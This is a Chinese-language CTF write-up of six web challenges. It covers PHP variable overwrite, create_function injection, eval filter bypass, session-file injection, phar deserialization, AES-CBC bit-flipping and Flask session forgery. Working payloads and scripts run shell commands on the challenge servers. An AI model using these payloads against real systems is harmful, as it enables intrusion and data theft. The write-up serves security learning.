- [XMCTF](#xmctf)
    - [WEB](#web)
        - [easy_web1](#easy_web1)
        - [web4](#web4)
        - [web3-ezSession](#web3-ezsession)
        - [web6](#web6)
        - [AES伪造](#aes伪造)
        - [web8](#web8)

# XMCTF

- id : rdd
- time : 2020-02-04
---

## WEB

- 星盟CTF平台WEB部分

---

### easy_web1

- 打开链接，读取源码

```php
<?php
show_source(__FILE__);
$key = "bad";
extract($_POST);
if($key === 'bad'){
    die('badbad!!!');
}
$act = @$_GET['act'];
$arg = @$_GET['arg'];
if(preg_match('/^[a-z0-9_]*$/isD',$act)) {
    echo 'check';
} else {
    $act($arg,'');
}

echo '666';
badbad!!!
```

- 总结出以下信息
> 利用extract()的变量覆盖漏洞，覆盖key的值

> GET方式传入参数act和arg，对act进行了过滤，不能是小写字母，数字，下划线，如果通过检测，则执行 ` $act($arg,''); ` 

> act的检测可以用` %5c `绕过

> 可以利用create_function()进行绕过

- 构造payload

``` http

POST : key=&a=good
GET : act=%5ccreate_function&arg=){}system('cat /ffflll4g');//

```

---

### web4

- 打开链接后，页面内容

```

好几个四季了，我在等我的主人回来
key：e086aa137fa19f67d27b39d0eca18610

```

- 对key进行md5解密，得出` key:1.1.1.1 `
- 刚开始尝试设置xff的值为` 127.0.0.1 ` ，但是并没有什么卵用。偶然之间试了一下传入xff的值为 ` 1.1.1.1 `，回显了下一步的链接

``` 
dhudndrgrhs.php
key：e086aa137fa19f67d27b39d0eca18610
```

- 访问链接后，读取源码

``` php
<?php
show_source(__FILE__);
error_reporting(0);
$disable_fun = ["assert","print_r","system", "shell_exec","ini_set", "scandir", "exec","proc_open", "error_log", "ini_alter", "ini_set", "pfsockopen", "readfile", "echo", "file_get_contents", "readlink", "symlink", "popen", "fopen", "file", "fpassthru"];
$disable_fun = array_merge($disable_fun, get_defined_functions()['internal']);
foreach($disable_fun as $i){
    if(stristr($_GET[shell], $i)!==false){
        die('xmctf');
    }
}
eval($_GET[shell]);
```

- 发现ban掉了好多函数，不过可以用拼接的方式绕过

- 构造paylaod

``` http
GET : shell=$a=sys;$b=tem;$c=$a.$b;$c('cat flag.php');
```

- 坑就在查看源码才有flag，可能是因为源码有` <?php ?>`

---

### web3-ezSession

- 打开连接，读取源码

``` php
<?php
highlight_file(__FILE__);
$content = @$_GET['content'] ? "---mylocalnote---\n" . $_GET['content'] : "";
$name = @$_GET['name'] ? $_GET['name'] : '';
str_replace('/', '', $name);
str_replace('\\', '', $name);
file_put_contents("/tmp/" . $name, $content);
session_start();
if (isset($_SESSION['username'])) {
    echo "Thank u,{$_SESSION['username']}";
}
//flag in flag.php

```

- 得到如下信息

> 可以往/tmp文件夹中传文件

> session['username'] 会回显

> flag在flag.php中

- 经过查阅资料，了解到，php的session临时文件有可能存储在/tmp中

- 查看flag.php，源码

```
u are not admin,only admin can see flag!
```

- 由于我最后才看的flag.php，所以我一度以为，这题坏了，最后经冠希哥提醒，直接才做出来

- 脚本

``` python
import requests
	
req = requests.session()

url = 'http://120.79.228.110:8801/'

tmp  = req.get(url)


payload = "admin"
# 截取phpsessid 闭合 ---mylocalnote---
s = '?name=sess_'+tmp.cookies['PHPSESSID'] + '&content=|s:4:"test";username|s:{}:"{}";'.format(len(payload),payload)
tmp2 = req.get(url+s)

#print(tmp2.text)
#print(url+s)

print(req.get(url+'/flag.php').text) 
```

---

### web6

- 打开链接，发现可以上传文件和下载文件
- 其中download.php 给出了源码

```php

$name = $_GET['name'];
$url = $_SERVER['QUERY_STRING'];
if (isset($name)){
    if (preg_match('/\.|etc|var|tmp|usr/i', $url)){
        echo("hacker!");
    }
    else{
        $name = safe_replace($name);
        if (preg_match('/base|class|file|function|index|upload_file/i', $name)){
            $filename = $name.'.php';
            $dir ="./";
            $down_host = $_SERVER['HTTP_HOST'].'/';
            if(file_exists(__DIR__.'/'.$dir.$filename)){
                $file = fopen ( $dir.$filename, "rb" );
                Header ( "Content-type: application/octet-stream" );
                Header ( "Accept-Ranges: bytes" );
                Header ( "Accept-Length: " . filesize ( $dir.$filename ) );
                Header ( "Content-Disposition: attachment; filename=" . $filename );
                echo fread ( $file, filesize ( $dir . $filename ) );
                fclose ( $file );
                exit ();
            }else{
                echo ("file doesn't exist.");
            }
        }
        if (preg_match('/flag/i', $name)){
            echo ("hacker!");
        }
    }

}
```

- 于是把` base.php class.php file.php function.php index.php upload_file.php `下载下来进行代码审计

-其中发现可利用点在` file.php ` 和 ` class.php ` 中

``` php
//file.php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php';
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
}
if(preg_match('/http|https|file:|gopher|dict|php|zip|\.\/|\.\.|flag/i',$file)) {
            die('hacker!'); 
if(substr($file,0,4)=='phar'){
            die('hacker!');
        }
}elseif(!preg_match('/\//i',$file))
{
    die('hacker!');
}
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 

//class.php
<html>
</html>
<?php

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $text= $this->source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
    public function __toString()
    {
        $text= $this->source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|zip|php|\.\.|flag/i',$this->source)) {
            die('hacker!');
        } 
        if(substr($this->source,0,4)=='phar'){
            die('hacker!');
        }else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|zip|php|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class S6ow
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->params[$key];
    }
    public function __call($name, $arguments)
    {
        if($this->{$name})
            $this->{$this->{$name}}($arguments);
    }
    public function file_get($value)
    {
        echo $this->file;
    }
}

class Sh0w
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = new Show('index.php');
        $this->str->source = $this->test;

    }
    public function __destruct()
    {
        $this->str->_show();
    }
}
?>

```


- 利用点在` file.php ` 文件中的` file_exists() `函数，这里用到的知识点是phar反序列化，题目中虽然说用` substr($this->source,0,4)=='phar') `过滤了phar，但是过滤的并不严谨，所以还是可以用Phar等大小写绕过，//后面才知道，这是非预期解

- 反序列化pop链构建思路
> ` Show `类中 ` _show ` 函数中过滤了 ` flag ` 所以没法用

> 能利用的只有` __tostring ` 方法中的` highlight_file `

> ` __toString ` 把类当作字符串使用时触发

> ` S6ow `类中的` file_get `方法中的` echo `存在字符串操作

> ` file_get `没有被调用，但是存在` __call `方法可以调用

> ` __call `在对象上下文中调用不可访问的方法时触发

> `Sh0w` 类中的` __destruct `方法会调用` _show `方法，当` str `为` Show `时，` Show `类中有` _show `方法，当时当` str `为` S6ow `时，` S6ow `中没有` _show `，会触发` __call `方法

> ` __call `中传入的参数：` $name `：方法名，此处为` _show` ;` $arguments `：方法的参数;于是在当执行` $this->{$name} `时，` $this->_show `，` S6ow `中不存在` _show `变量，触发` __get `方法，只需要将` params `赋值为` array("_show" => "file_get") `，就可以成功调用` file_get `方法。

> ` Sh0w `类中的` __destruct `方法会在对象销毁时自动触发

> 构造利用链：` Sh0w `：` __destruct `调用` S6ow `中的` _show `，从而触发` __call `，再触发` __get `，然后会执行` echo `方法，触发` __toString `方法，可以读取文件

- 构造的paylaod如下：

```php
<?php
include('class.php');
$r1 = new Sh0w();
$r2 = new Show();
$r3 = new S6ow();
$r2 -> source = '/flag.txt';
$r3 -> file = $r2;
$r3 -> params = array("_show" => "file_get");
$r1 -> str = $r3;
$phar = new Phar('rdd.phar');
$phar -> stopBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar -> addFromString('test.txt','test');
$phar -> setMetadata($r1);
$phar -> stopBuffering();
copy("rdd.phar","rdd.gif");
?>
```

- 最后利用phar协议读取即可

``` http
http://ip:port/file.php?file=Phar:///var/www/html/upload/filename.jpg
```

---

### AES伪造

- 题目是AES伪造，读取源码
```php
<?php 
error_reporting(0);
include 'include.php';
if(isset($_GET['s'])){
    $s=$_GET['s'];
    if(strlen($s)!=96){
        die('s length must be 96!');
    }
    $s=decryptString($s); //mode_cbc
    print($s);
    parse_str(substr($s,16));
    if($uu=='admin'){
        if(file_get_contents($ff)=='phpinfo'){
            echo $ccc;
            system($ccc);
        }
    }

}
else
{
    highlight_file(__FILE__);
    print('<br>"Welcome to the code system!This is a test string" => '.ecryptdString('Welcome to the code system!This is a test string'));
    
}
?>

"Welcome to the code system!This is a test string" => 2363303cf2fae8b1bbe443fe2d12947e5abcf9c0ceb12ce5fd3a43504de0bf0621b9917a715dad17f828ff0ace6ec816
```

- 查阅资料后，编写脚本。这里有一个坑的地方是，只有4个字节可以执行命令，于是用` nl * `读取所有文件

```python
import requests
a = 'is a test string'
b = '//input&ccc=nl *'
c = '5abcf9c0ceb12ce5fd3a43504de0bf0621b9917a715dad17f828ff0ace6ec816'
res = ''
for i in range(int(len(a))):
	t1 = c[i*2:(i+1)*2]
	t2 = a[i]
	t3 = b[i]
	t4 = str(hex(int(ord(chr(int(t1,16)))^ord(t2)^ord(t3)))).replace("0x","")
	if len(t4) == 1 :
		t4 = '0'+t4
	print(t1,t2,t3,t4)
	res += t4
tmp = res 
res = '2363303cf2fae8b1bbe443fe2d12947e' + res + '21b9917a715dad17f828ff0ace6ec816'
print(res)
url = 'http://120.79.228.110:8878/?s='+res
b = 'uu=admin&ff=php:'
html = requests.get(url).text
print(html)
a = html[16:32]
print(len(a))
c = res
res = ''
for i in range(int(len(a))):
	t1 = c[i*2:(i+1)*2]
	t2 = a[i]
	t3 = b[i]
	t4 = str(hex(int(ord(chr(int(t1,16)))^ord(t2)^ord(t3)))).replace("0x","")
	if len(t4) == 1 :
		t4 = '0'+t4
	print(t1,t2,t3,t4)
	res += t4
res = res+tmp+'21b9917a715dad17f828ff0ace6ec816'
print(res)
data = 'phpinfo'
url = 'http://120.79.228.110:8878/?s='+res
html = requests.post(url,data=data).text
print(html)
```

---

### web8

- 打开链接，查看页面信息

```
Only the admin can get the flag,flag in /flag

you name is None
```

- 传入` name=admin `，并没有什么卵用

- 发现是flask框架的，于是传入` name={{7*7}} `和` name={{7*'7'}} `，回显内容符合ssti的标准，但是打paylaod的时候发现都不能用，查看{{config}}，获得一些参数` DEBUG `和` SECRET_KEY `

``` python
<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': True, 'SECRET_KEY': 'woshicaiji', 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>
```

---

- 通过因为debug是开着的，所以通过传入错误的参数，可以查看部分源码，推测出的后台源码

``` python
from flask import Flask, request,url_for
from jinja2 import Template

app = Flask(__name__)
app.config['SECRET_KEY']='woshicaiji'

@app.route("/")
def index():
    name = request.args.get('name')
	if name and len(name)>10:
		return render_template_string("no")
	template = '''
<p>Only the admin can get the flag,flag in /flag</p>
<p>you name is {0}</p>
'''.format(name)
​	return render_template_string(template)
```

- ` len(name)>10 ` 限制了长度，所以不可能是ssti了
- 注意到题目中的` Only the admin can get the flag,flag in /flag `，但是经过测试发现，应该是在` ./flag `的
- 查看session后大发现，可以利用前面的` SECRET_KEY `进行session伪造
- github上找个轮子，运行后构造username为admin的session，
``` 
eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.XjfIcQ.Rzpeoz8dtbUfY0J2b8TahzNVEHA
```

- 访问` ./flag `，即可得到flag

---
